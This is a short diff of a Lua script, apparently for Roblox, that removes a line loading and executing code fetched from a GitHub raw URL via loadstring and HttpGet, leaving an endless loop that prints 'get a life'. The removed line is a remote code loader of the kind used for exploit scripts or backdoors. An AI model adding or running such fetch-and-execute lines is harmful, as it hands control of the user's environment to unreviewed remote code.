@@ -1,4 +1,3 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/theplantman/amongussussyimpostor/main/omgchadcheckifumessthisupunoob', true))()
 while true do
     print("get a life")
 end
